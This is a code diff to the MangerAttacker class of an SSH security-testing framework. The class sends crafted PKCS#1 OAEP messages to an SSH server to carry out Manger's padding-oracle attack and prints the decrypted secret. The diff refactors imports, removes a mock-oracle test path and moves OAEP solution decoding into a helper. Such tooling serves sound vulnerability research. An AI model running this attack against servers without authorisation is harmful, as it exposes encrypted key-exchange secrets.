@@ -7,6 +7,8 @@
  */
 package de.rub.nds.sshattacker.attacks.impl;
 
+import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
+
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.sshattacker.attacks.KeyFetcher;
 import de.rub.nds.sshattacker.attacks.ParallelExecutor;
@@ -16,8 +18,10 @@ import de.rub.nds.sshattacker.attacks.exception.OracleUnstableException;
 import de.rub.nds.sshattacker.attacks.general.Vector;
 import de.rub.nds.sshattacker.attacks.padding.VectorResponse;
 import de.rub.nds.sshattacker.attacks.padding.vector.FingerprintTaskVectorPair;
-import de.rub.nds.sshattacker.attacks.pkcs1.*;
-import de.rub.nds.sshattacker.attacks.pkcs1.oracles.MockOracle;
+import de.rub.nds.sshattacker.attacks.pkcs1.Manger;
+import de.rub.nds.sshattacker.attacks.pkcs1.MangerWorkflowGenerator;
+import de.rub.nds.sshattacker.attacks.pkcs1.Pkcs1Vector;
+import de.rub.nds.sshattacker.attacks.pkcs1.Pkcs1VectorGenerator;
 import de.rub.nds.sshattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
 import de.rub.nds.sshattacker.attacks.pkcs1.util.OaepConverter;
 import de.rub.nds.sshattacker.attacks.response.EqualityError;
@@ -31,28 +35,15 @@ import de.rub.nds.sshattacker.core.constants.Bits;
 import de.rub.nds.sshattacker.core.constants.KeyExchangeAlgorithm;
 import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
 import de.rub.nds.sshattacker.core.state.State;
+import java.math.BigInteger;
+import java.security.interfaces.RSAPublicKey;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.LinkedList;
+import java.util.List;
 import org.apache.logging.log4j.Level;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
-import org.bouncycastle.util.io.pem.PemReader;
-
-import javax.crypto.NoSuchPaddingException;
-import java.io.FileReader;
-import java.io.IOException;
-import java.io.Reader;
-import java.math.BigInteger;
-import java.nio.ByteBuffer;
-import java.security.InvalidKeyException;
-import java.security.KeyFactory;
-import java.security.NoSuchAlgorithmException;
-import java.security.interfaces.RSAPrivateKey;
-import java.security.interfaces.RSAPublicKey;
-import java.security.spec.InvalidKeySpecException;
-import java.security.spec.PKCS8EncodedKeySpec;
-import java.security.spec.X509EncodedKeySpec;
-import java.util.*;
-
-import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
 
 /**
  * Sends differently formatted PKCS#1 v2.x messages to the SSH server and observes the server
@@ -285,11 +276,6 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
     @Override
     public void executeAttack() {
 
-        if (config.isMockAttack()) {
-            mockAttack();
-            return;
-        }
-
         if (!isVulnerable()) {
             LOGGER.warn("The server is not vulnerable to Manger's attack");
             return;
@@ -326,94 +312,14 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
         attacker.attack();
         BigInteger solution = attacker.getSolution();
         BigInteger secret =
-                decodeSolution(
+                OaepConverter.decodeSolution(
                         solution,
+                        getHashInstance(),
                         ((RSAPublicKey) oracle.getPublicKey()).getModulus().bitLength()
                                 / Bits.IN_A_BYTE);
 
         CONSOLE.info("Encoded Solution: " + solution);
         CONSOLE.info("Decoded Secret: " + secret);
-    }
-
-    private void mockAttack() {
-        RSAPrivateKey privateKey;
-        RSAPublicKey publicKey;
-        MockOracle oracle;
-        ClassLoader loader = Thread.currentThread().getContextClassLoader();
-        try {
-            // Read private key file and create key factory
-            String privateKeyFileName = config.getMockKeyFileName();
-            Reader fileReader =
-                    new FileReader(
-                            Objects.requireNonNull(loader.getResource(privateKeyFileName))
-                                    .getFile());
-            PemReader reader = new PemReader(fileReader);
-            byte[] content = reader.readPemObject().getContent();
-            KeyFactory factory = KeyFactory.getInstance("RSA");
-
-            // Create private key from file
-            PKCS8EncodedKeySpec privateKeySpec = new PKCS8EncodedKeySpec(content);
-            privateKey = (RSAPrivateKey) factory.generatePrivate(privateKeySpec);
-
-            // Read public key
-            String publicKeyFileName = config.getMockKeyFileName() + ".pub";
-            Reader pubFileReader =
-                    new FileReader(
-                            Objects.requireNonNull(loader.getResource(publicKeyFileName))
-                                    .getFile());
-            PemReader pubReader = new PemReader(pubFileReader);
-            byte[] pubContent = pubReader.readPemObject().getContent();
-
-            // Create public key from file
-            X509EncodedKeySpec pubKeySpec = new X509EncodedKeySpec(pubContent);
-            publicKey = (RSAPublicKey) factory.generatePublic(pubKeySpec);
-
-            oracle = new MockOracle(publicKey, privateKey);
-        } catch (IOException
-                | NoSuchAlgorithmException
-                | InvalidKeySpecException
-                | NoSuchPaddingException
-                | InvalidKeyException e) {
-            throw new OracleException("Could not initialize Mock Oracle", e);
-        }
-
-        byte[] encryptedSecret = ArrayConverter.hexStringToByteArray(config.getEncryptedSecret());
-        Manger attacker = new Manger(encryptedSecret, oracle);
-        attacker.attack();
-        BigInteger solution = attacker.getSolution();
-
-        BigInteger secret =
-                decodeSolution(
-                        solution,
-                        ((RSAPublicKey) oracle.getPublicKey()).getModulus().bitLength()
-                                / Bits.IN_A_BYTE);
-
-        CONSOLE.info("Encoded Solution: " + solution);
-        CONSOLE.info("Decoded Secret: " + secret);
-    }
-
-    private BigInteger decodeSolution(BigInteger solution, int publicKeyByteLength) {
-        try {
-            // Decode solution
-            byte[] solutionBytes = solution.toByteArray();
-
-            byte[] result =
-                    OaepConverter.doOaepDecoding(
-                            solutionBytes, getHashInstance(), publicKeyByteLength);
-
-            CONSOLE.debug("Secret with length field as byte array: " + Arrays.toString(result));
-            CONSOLE.debug("Secret with length field: " + new BigInteger(result));
-
-            // Cut off length field to get secret as decimal number
-            ByteBuffer secretBuffer = ByteBuffer.wrap(result);
-            secretBuffer.position(4);
-            byte[] secretBytes = new byte[result.length - 4];
-            secretBuffer.get(secretBytes);
-            return new BigInteger(secretBytes);
-        } catch (NoSuchAlgorithmException e) {
-            CONSOLE.error("Could not decode solution.", e);
-            return BigInteger.ZERO;
-        }
     }
 
     private ResponseFingerprint extractValidFingerprint(RSAPublicKey publicKey) {
